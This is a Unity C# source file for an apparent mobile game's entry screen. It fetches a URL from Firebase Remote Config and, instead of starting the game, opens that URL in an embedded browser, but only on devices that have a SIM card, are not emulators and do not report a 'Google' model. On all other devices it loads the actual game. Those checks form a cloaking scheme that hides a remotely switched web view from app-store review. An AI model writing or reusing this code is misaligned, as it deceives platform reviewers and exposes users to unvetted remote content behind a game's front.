using Firebase;
using Firebase.Extensions;
using Firebase.RemoteConfig;
using Game.Constants;
using ModestTree;
using UnityEngine;
using UnityEngine.SceneManagement;
using UnityEngine.UI;
using Utils;
using VoltstroStudios.UnityWebBrowser.Core;
using Zenject;

namespace Game.Entry
{
    public class EntryPresenter : IInitializable, ILateDisposable
    {
        public EntryPresenter(BaseUwbClientManager webBrowser, GameObject webBrowserView, Button startButton)
        {
            _webBrowser = webBrowser;
            _webBrowserView = webBrowserView;
            _startButton = startButton;
        }

        private const int SceneIndex = 1;
        private const string UrlFirebaseKey = "url";

        private readonly BaseUwbClientManager _webBrowser;
        private readonly GameObject _webBrowserView;
        private readonly Button _startButton;

        private bool _isStarted = false;

        private void OpenUrl(string url)
        {
            _startButton.gameObject.SetActive(false);
            _webBrowserView.SetActive(true);
            _webBrowser.browserClient.initialUrl = url;
            _webBrowser.browserClient.LoadUrl(url);
        }

        public void Initialize()
        {
            _startButton.onClick.AddListener(Start);
        }

        public void LateDispose()
        {
            _startButton.onClick.RemoveListener(Start);
        }

        private void Start()
        {
            if (_isStarted) return;

            _isStarted = true;
            
            if (PlayerPrefs.HasKey(ProjectConstants.UrlPlayerPrefsKey))
            {
                var url = PlayerPrefs.GetString(ProjectConstants.UrlPlayerPrefsKey);
                OpenUrl(url);
            }
            else
            {
                FirebaseApp
                    .CheckAndFixDependenciesAsync()
                    .ContinueWithOnMainThread(task => {
                        var dependencyStatus = task.Result;
                        if (dependencyStatus == DependencyStatus.Available)
                        {
                            FirebaseRemoteConfig.DefaultInstance.FetchAndActivateAsync()
                                .ContinueWithOnMainThread(_ => OnComplete());
                        }
                    });
                
                void OnComplete()
                {
                    var url = FirebaseRemoteConfig.DefaultInstance.GetValue(UrlFirebaseKey).StringValue;
                    if (Validate(url))
                    {
                        PlayerPrefs.SetString(ProjectConstants.UrlPlayerPrefsKey, url);
                        OpenUrl(url);
                    }
                    else
                    {
                        SceneManager.LoadScene(SceneIndex);
                    }
                }
            }
        }

        private bool Validate(string url)
        {
            var isUrlEmpty = url.IsEmpty();
            if (isUrlEmpty) return false;

            var isGoogle = SystemInfo.deviceModel.Contains("Google");
            if (isGoogle) return false;

            var hasSim = CheckSim.HasSim();
            if (!hasSim) return false;
            
            var isEmulator = EmulatorValidator.IsEmulator();
            if (isEmulator) return false;

            return true;
        }
    }
}